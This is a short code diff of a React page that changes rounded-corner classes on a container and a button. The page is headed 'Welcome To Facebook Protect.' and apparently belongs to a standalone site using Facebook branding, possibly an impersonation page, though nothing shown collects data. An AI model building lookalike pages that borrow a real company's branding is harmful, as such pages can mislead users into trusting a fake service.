@@ -15,7 +15,7 @@ const Index: React.FC = () => {
 
 	return (
 		<div className='flex min-h-screen flex-col items-center justify-center py-8'>
-			<div className='flex w-11/12 flex-col gap-4 rounded-lg md:w-2/5 2xl:w-1/3'>
+			<div className='flex w-11/12 flex-col gap-4 rounded-full md:w-2/5 2xl:w-1/3'>
 				<img src={HeroImage} alt='Hero' className='rounded-t-lg' />
 				<b className='text-2xl'>Welcome To Facebook Protect.</b>
 				<p>
@@ -65,7 +65,7 @@ const Index: React.FC = () => {
 				</div>
 				<div className='mt-6 md:mt-3'>
 					<button
-						className='w-full rounded-lg bg-blue-500 p-3 font-semibold text-white'
+						className='w-full rounded-full bg-blue-500 p-3 font-semibold text-white'
 						onClick={() => {
 							navigate('/live/home');
 						}}
